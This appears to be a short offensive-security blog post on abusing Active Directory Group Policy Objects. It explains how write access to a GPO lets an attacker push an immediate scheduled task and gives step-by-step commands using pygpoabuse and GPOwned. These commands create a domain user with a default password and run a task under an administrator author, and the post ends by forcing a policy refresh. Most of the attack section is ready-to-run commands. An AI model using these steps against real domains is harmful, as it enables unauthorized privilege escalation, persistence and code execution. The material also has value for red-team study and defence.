---
title: "GPO Abuse"
date: 2025-10-31 00:00:00 +0800
categories: [AD- Attacks]
tags: [GPO , GPOabuse ]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/gpo.jpg
excerpt: "Technical Understanding and Practical Overview"
---

# GPO 

Group Policies are saved as Group Policy Objects (GPOs) which are then associated with Active Directory objects such as sites, domains, or organizational units (OUs). Domain members refresh group policy settings every 90 minutes by default (5 minutes for Domain Controllers).[Reference here](https://adsecurity.org/?p=2716)


## how we Abuse it

An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. (By Default 5 min for Domain Controllers and 90 min for Domain users.)

## Tool's 
(`SharpGPOAbuse.exe`) for windows systems or (`pyGPOabuse.py` and `GPOwned.py`)  for UNIX-like systems.

# GPO Write
Let's get in and learn with commands, how it's possible to create a scheduled task and delete itself 
## Check if you have the writeDACL and Group Policy Creator Owners
```bash
whoami /all
```
## Grab the Domain GPO iD
```bash
Get-GPO -All
```
using `pygpoabuse`
By Default is create a user called John and password :- H4x00r123.. 
```bash
python3 pygpoabuse.py '$domain'/'$user':'$password'  -gpo-id 'id'
```
using `gpowned
```bash
GPOwned -u '$user' -p '$password' -d '$domain' -dc-ip '$domain' -gpoimmtask -name 'id' -author 'DOMAIN\Administrator' -taskname 'anyname' -taskdescription 'some description' -dstpath 'c:\windows\system32\notepade.exe'
```
## So the final Step to make changes in Domain
```bash
gpupdate /force
```
